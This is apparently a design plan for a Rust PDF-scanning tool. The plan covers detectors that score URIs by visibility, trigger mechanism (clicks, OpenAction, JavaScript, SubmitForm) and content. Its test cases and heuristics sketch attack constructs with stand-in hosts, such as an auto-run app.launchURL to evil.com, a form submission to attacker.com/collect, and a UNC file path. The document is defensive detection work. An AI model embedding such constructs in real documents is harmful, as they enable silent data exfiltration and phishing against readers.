# URI Classification Plan

## Overview
This plan outlines a multi-level URI analysis system for PDFs that evaluates URIs based on their context, trigger mechanisms, and content. The goal is to distinguish between legitimate hyperlinks and potential data exfiltration or phishing attempts.

## Current State
- `UriDetector` (crates/sis-pdf-detectors/src/lib.rs:717-765) detects URI presence
- All URIs currently flagged at Medium severity
- Basic payload extraction and metadata collection
- Detects URIs in both action dictionaries and annotations
- Uses `external_context::ExternalActionContextDetector` for some contextual analysis

## Classification Dimensions

### 1. URI Presence (INFO Level)
**Rationale**: The mere presence of a URI is not inherently suspicious. Many legitimate PDFs contain hyperlinks to documentation, references, etc.

**Implementation**:
- Create `UriPresenceDetector` with Severity::Info
- Record basic URI metadata:
  - Count of URIs in document
  - Unique domains referenced
  - URI schemes (http/https/file/javascript)

**Evidence Collected**:
- URI string values
- Object locations
- Page numbers (via annotation parent map)

### 2. URI Context/Placement
**Rationale**: WHERE a URI appears indicates intent. Clearly visible hyperlinks in text are legitimate; hidden URIs in invisible annotations or layers are suspicious.

**Context Categories**:

#### Legitimate (Low/Info)
- **Visible Text Annotation**
  - `/Subtype /Link` with visible `/Rect` on page
  - `/C` (color) suggests visible rendering
  - `/Border` present (even if [0 0 0])
  - Linked to actual content stream text

- **Document Metadata**
  - Catalog `/URI` base URIs
  - Document info dictionary
  - Outlines/Bookmarks

#### Suspicious (Medium)
- **Hidden Annotations**
  - `/Rect` outside page boundaries
  - Zero-size `/Rect [0 0 0 0]`
  - `/F` (flags) with hidden bit set (bit 2)
  - Inside optional content group (OCG) that defaults to hidden

- **Overlapping/Deceptive**
  - Multiple URIs at same coordinates
  - URI annotation over other interactive element
  - Transparent or white-on-white rendering

#### High Risk (High)
- **Completely Hidden**
  - Not referenced from any visible page element
  - Inside object stream with no annotation reference
  - In incremental update that shadows legitimate link

**Implementation**:
```rust
// New detector: UriContextDetector
pub struct UriContext {
    visibility: UriVisibility,
    placement: UriPlacement,
    rect: Option<[f32; 4]>,
    page_bounds: Option<[f32; 4]>,
    flags: Option<u32>,
}

enum UriVisibility {
    Visible,      // Normal annotation with visible rect
    HiddenRect,   // Rect outside page or zero-size
    HiddenFlag,   // Annotation flags mark as hidden
    NoAnnot,      // URI not in annotation (action only)
}

enum UriPlacement {
    Annotation,         // Normal /Annot with /Subtype /Link
    OpenAction,         // Document /OpenAction
    PageAction,         // /AA (Additional Actions) on page
    FieldAction,        // Form field action
    NonStandardAction,  // Other action triggers
}
```

**Analysis Steps**:
1. Extract `/Rect` from annotation dictionary
2. Get page `/MediaBox` or `/CropBox` for bounds
3. Compare rect coordinates against page bounds
4. Check `/F` annotation flags (bit 1=invisible, bit 2=hidden)
5. Check if annotation is in content stream (visible text)
6. Detect OCG membership and default visibility state

### 3. URI Trigger Mechanisms
**Rationale**: HOW a URI is triggered indicates data exfiltration risk. User-initiated clicks are normal; automatic JavaScript triggers or form submissions are suspicious.

**Trigger Categories**:

#### User-Initiated (Low)
- **Click Actions**
  - Annotation `/A` (action) triggered by click
  - Bookmark/Outline entry
  - Form button with explicit user action

#### Automatic (Medium-High)
- **Document Open**
  - `/OpenAction` with `/URI`
  - Catalog-level `/AA` with `/WC` (will close), `/WS` (will save)

- **Page Events** (Medium)
  - Page `/AA` with `/O` (page open), `/C` (page close)
  - Triggered when user navigates to page

- **JavaScript-Triggered** (High)
  - URI in `/JavaScript` action that executes on event
  - `app.launchURL()` or `submitForm()` in JS code
  - Dynamic URI construction in JavaScript

- **Form Submission** (High)
  - `/SubmitForm` action (already detected)
  - `/F` target is external URL
  - Form data exfiltration to attacker server

**Implementation**:
```rust
pub struct UriTrigger {
    mechanism: TriggerMechanism,
    event: Option<String>,       // AA event key (/O, /C, /WC, etc.)
    automatic: bool,              // true if no user action required
    js_involved: bool,            // true if JavaScript in chain
}

enum TriggerMechanism {
    Click,              // Annotation click
    OpenAction,         // Document open
    PageOpen,           // Page navigation
    PageClose,          // Page close
    FormSubmit,         // Form submission
    JavaScript,         // JS-initiated
    FieldCalculate,     // Form field calculation
    FieldFormat,        // Form field format
    FieldValidate,      // Form field validation
    Other,
}
```

**Analysis Steps**:
1. Walk action chain to find URI
2. Identify trigger point (annotation, OpenAction, AA event)
3. Extract AA event key if present
4. Check for JavaScript in action chain
5. Detect SubmitForm with external URL
6. Flag automatic vs. user-initiated triggers

**Cross-Reference with Existing Detectors**:
- `external_context::ExternalActionContextDetector` already analyzes some of this
- `AAEventDetector` identifies AA events
- `JavaScriptDetector` finds JS presence
- Consolidate metadata from these detectors

### 4. URI Content Analysis
**Rationale**: WHAT the URI contains reveals malicious intent. Legitimate URLs are readable; malicious URLs are often obfuscated, use tracking patterns, or point to known-bad infrastructure.

**Content Signals**:

#### Structure
- **Encoding/Obfuscation** (Medium-High)
  - Hex-encoded characters (e.g., `%68%74%74%70`)
  - Unicode escapes
  - Base64 in query parameters
  - Double/triple URL encoding
  - IP addresses instead of domains (especially uncommon)

- **Length** (Low-Medium)
  - Extremely long URLs (>500 chars) suggest tracking/fingerprinting
  - Very short URLs with redirectors (bit.ly, etc.)

#### Patterns
- **Tracking** (Info-Low)
  - Query parameters: `utm_source`, `utm_campaign`, `fbclid`, `gclid`
  - Session IDs in URL
  - Fingerprinting parameters

- **Data Exfiltration** (High)
  - Query params that look like encoded data
  - Base64 blobs in URL
  - Many parameters with short values (field data)
  - Parameter names like `data`, `payload`, `info`

- **Phishing Indicators** (High)
  - Domain typosquatting (detected by edit distance to common domains)
  - Homoglyph characters (lookalike Unicode)
  - Subdomain tricks (`paypal.attacker.com`)
  - Suspicious TLDs (`.tk`, `.ml`, `.ga`, etc.)

#### Protocol/Scheme
- **File URLs** (Medium)
  - `file://` URIs can access local filesystem
  - UNC paths (`file://\\attacker.com\share`)

- **JavaScript URLs** (High)
  - `javascript:` pseudo-protocol
  - Can execute arbitrary code

- **Non-HTTPS** (Low-Medium)
  - `http://` without TLS
  - Mixed content if PDF is from HTTPS source

**Implementation**:
```rust
pub struct UriContentAnalysis {
    url: String,
    scheme: String,
    domain: Option<String>,
    path: Option<String>,
    query_params: Vec<(String, String)>,

    // Signals
    obfuscation_level: ObfuscationLevel,
    tracking_params: Vec<String>,
    suspicious_patterns: Vec<String>,
    length: usize,

    // Risk factors
    is_ip_address: bool,
    is_file_uri: bool,
    is_javascript_uri: bool,
    is_http: bool,
    suspicious_tld: bool,
    has_data_exfil_pattern: bool,
}

enum ObfuscationLevel {
    None,
    Light,      // Some percent-encoding (normal)
    Medium,     // Extensive percent-encoding, base64 params
    Heavy,      // Multiple layers, unicode escapes, etc.
}
```

**Analysis Steps**:
1. Parse URI string into components (scheme, domain, path, query)
2. Check for percent-encoding density
3. Detect base64 patterns in query params
4. Compare domain against common typosquat patterns
5. Analyze TLD against suspicious list
6. Check for tracking parameter patterns
7. Detect data exfiltration query param patterns
8. Calculate obfuscation score

**Heuristics**:
```python
# Obfuscation score
percent_encoded_ratio = hex_chars / total_chars
if percent_encoded_ratio > 0.3:
    obfuscation = Medium
if contains_base64_in_params and percent_encoded_ratio > 0.2:
    obfuscation = Heavy

# Data exfiltration pattern
if len(query_params) > 5 and avg_param_value_length > 50:
    suspicious_patterns.append("many_long_params")
if any(key in ["data", "payload", "info", "d", "p"] for key, _ in params):
    suspicious_patterns.append("exfil_param_names")
```

## New Detector Architecture

### Detectors to Create/Modify

#### 1. `UriPresenceDetector` (NEW)
- **Purpose**: Info-level reporting of all URIs
- **Severity**: Info
- **Output**: Document-level summary
  - Total URI count
  - Unique domains
  - Scheme distribution
  - Page distribution

#### 2. `UriContextDetector` (NEW)
- **Purpose**: Analyze URI placement and visibility
- **Severity**: Low to High based on context
- **Output**: Per-URI findings with context metadata
  - Visibility classification
  - Placement type
  - Rect coordinates vs page bounds
  - OCG membership

#### 3. `UriTriggerDetector` (NEW)
- **Purpose**: Analyze how URIs are triggered
- **Severity**: Medium to High for automatic/JS triggers
- **Output**: Per-URI trigger analysis
  - Trigger mechanism
  - Event type (if AA)
  - Automatic vs manual
  - JavaScript involvement

#### 4. `UriContentDetector` (NEW)
- **Purpose**: Analyze URI content for malicious patterns
- **Severity**: Info to High based on content
- **Output**: Per-URI content analysis
  - Obfuscation score
  - Suspicious patterns detected
  - Tracking parameters
  - Phishing indicators

#### 5. Modify `UriDetector` (EXISTING)
- **Keep for backward compatibility**
- **Or**: Refactor to orchestrate the above detectors
- **Option A**: Keep as simple presence detector
- **Option B**: Make it a "composite" that delegates to specialized detectors

### Integration with Existing Detectors

#### External Context Detector
- `external_context::ExternalActionContextDetector` already analyzes some triggers
- Coordinate with UriTriggerDetector to avoid duplication
- Share metadata about automatic actions

#### JavaScript Detector
- When JS code contains `app.launchURL()`, cross-reference with URIs
- Extract dynamic URI construction patterns
- Flag JS-triggered URI navigations

#### SubmitForm Detector
- Already detects form submissions
- Enhance to flag external URLs in `/F` target
- Add data exfiltration pattern detection

## Severity Assignment Strategy

### Composite Scoring
Instead of fixed severities, use a composite score based on multiple dimensions:

```
Base Score = Presence (0 points)

Context Modifiers:
  + Visible annotation: 0
  + Hidden rect: +30
  + Hidden flag: +40
  + No annotation: +20
  + Overlapping URIs: +25

Trigger Modifiers:
  + User click: 0
  + Page open: +20
  + Document open: +40
  + JavaScript: +50
  + Form submit: +60

Content Modifiers:
  + No obfuscation: 0
  + Light obfuscation: +10
  + Medium obfuscation: +30
  + Heavy obfuscation: +50
  + JavaScript URI: +70
  + File URI: +40
  + IP address: +20
  + Suspicious TLD: +30
  + Data exfil pattern: +60
  + Phishing indicators: +50

Final Severity:
  0-20:   Info
  21-50:  Low
  51-80:  Medium
  81-120: High
  121+:   Critical (if we add this level)
```

### Examples

#### Legitimate Link
- Visible annotation (0)
- User click (0)
- HTTPS domain, no obfuscation (0)
- **Total: 0 → Info**

#### Tracking Link
- Visible annotation (0)
- User click (0)
- HTTPS, light obfuscation (+10), tracking params
- **Total: 10 → Info**

#### Hidden Phishing
- Hidden rect (+30)
- Page open (+20)
- HTTP, suspicious domain (+30), obfuscated (+30)
- **Total: 110 → High**

#### Data Exfiltration
- Hidden annotation (+40)
- JavaScript trigger (+50)
- Data exfil pattern (+60)
- **Total: 150 → Critical**

## Implementation Phases

### Phase 1: Content Analysis (Quick Win)
1. Implement URI parsing utility
2. Create `UriContentDetector`
3. Add obfuscation detection
4. Add phishing pattern detection
5. **Output**: Immediate value from content analysis

### Phase 2: Context Analysis
1. Implement annotation rectangle extraction
2. Add page bounds comparison
3. Create `UriContextDetector`
4. Integrate with page tree analysis
5. **Output**: Hidden URI detection

### Phase 3: Trigger Analysis
1. Extract action chain walking logic (may already exist)
2. Create `UriTriggerDetector`
3. Integrate with AA event detection
4. Cross-reference with JavaScript detector
5. **Output**: Automatic trigger detection

### Phase 4: Presence Summary
1. Create `UriPresenceDetector`
2. Aggregate statistics from other detectors
3. Generate document-level summary
4. **Output**: Overview of URI landscape

### Phase 5: Integration & Scoring
1. Implement composite scoring algorithm
2. Update severity assignments
3. Add cross-detector metadata sharing
4. Update external context detector coordination
5. **Output**: Unified URI risk assessment

## Testing Strategy

### Test Cases

#### Test 1: Legitimate Document
```
PDF with:
- Visible /Link annotations to https://example.com
- Reference links to https://doi.org/10.1000/xyz
- Metadata URI base
Expected: All Info/Low severity
```

#### Test 2: Hidden Link
```
PDF with:
- /Rect [0 0 0 0] annotation
- URI to http://attacker.com
Expected: High severity (hidden context)
```

#### Test 3: JavaScript Trigger
```
PDF with:
- /OpenAction → /JavaScript → app.launchURL("http://evil.com")
Expected: High severity (JS trigger + automatic)
```

#### Test 4: Data Exfiltration
```
PDF with:
- /SubmitForm action
- /F "http://attacker.com/collect?data=..."
- Many query parameters with field values
Expected: High severity (exfil pattern)
```

#### Test 5: Obfuscated URI
```
PDF with:
- URI: "http://attacker.com/path?d=%68%65%6c%6c%6f"
- Heavy percent-encoding
Expected: Medium severity (obfuscation)
```

#### Test 6: Phishing
```
PDF with:
- URI to "http://paypa1.com" (typosquat)
- Suspicious TLD
Expected: High severity (phishing indicators)
```

### Validation
- Compare against known malicious PDFs (VirusTotal samples)
- Verify low false positive rate on legitimate PDFs (arXiv papers, etc.)
- Check performance impact (should be Cost::Cheap to Cost::Moderate)

## Performance Considerations

### Complexity
- URI content parsing: O(n) per URI, fast
- Context analysis: O(n) per annotation, requires page tree walk
- Trigger analysis: O(n) per action, may require action chain walk
- Total: O(objects) with low constant factor

### Optimization
- Cache page bounds lookup
- Cache annotation parent map (already exists)
- Lazy URI parsing (only parse if needed)
- Share data structures between detectors

### Resource Limits
- Max URIs to analyze: 1000 per document (prevent DoS)
- Max URL length: 10,000 characters
- Max query parameters: 100

## Output Format

### Finding Metadata
Each URI finding should include comprehensive metadata:

```rust
meta: {
    // From UriPresenceDetector
    "uri.count_total": "15",
    "uri.count_unique_domains": "3",

    // From UriContentDetector
    "uri.url": "http://example.com/path?param=value",
    "uri.scheme": "http",
    "uri.domain": "example.com",
    "uri.obfuscation": "light",
    "uri.length": "45",
    "uri.is_ip": "false",
    "uri.suspicious_tld": "false",
    "uri.tracking_params": "utm_source,utm_campaign",
    "uri.patterns": "tracking",

    // From UriContextDetector
    "uri.visibility": "visible",
    "uri.placement": "annotation",
    "uri.rect": "[100, 200, 300, 250]",
    "uri.page_bounds": "[0, 0, 612, 792]",
    "uri.flags": "4",

    // From UriTriggerDetector
    "uri.trigger": "click",
    "uri.automatic": "false",
    "uri.js_involved": "false",

    // Composite scoring
    "uri.risk_score": "15",
    "uri.risk_level": "low",
}
```

## Future Enhancements

### Machine Learning
- Train classifier on labeled malicious/benign URIs
- Feature extraction from URI content
- Integration with ONNX model (if ml-detection feature is used)

### External Threat Intelligence
- Query URLs against VirusTotal API (optional, user-provided key)
- Check against URL blocklists
- DNS reputation lookups

### Advanced Obfuscation Detection
- Punycode (IDN) homoglyph attacks
- Right-to-left override characters
- Zero-width characters in domains

### Link Following
- Option to follow redirects (with safety limits)
- Detect redirect chains
- Flag unexpected final destinations

## References

- PDF 1.7 Specification: Section 8.5 (Annotations), 8.6.1 (URI Actions)
- OWASP: Phishing URL Detection
- Common URL obfuscation techniques
- Previous similar work: `external_context::ExternalActionContextDetector`

## Success Criteria

✅ Info-level reporting of legitimate URIs (no false alarms)
✅ High-severity detection of hidden URIs
✅ High-severity detection of automatic/JS-triggered URIs
✅ High-severity detection of obfuscated/phishing URIs
✅ Comprehensive metadata for manual review
✅ Low performance overhead
✅ No false positives on legitimate academic papers
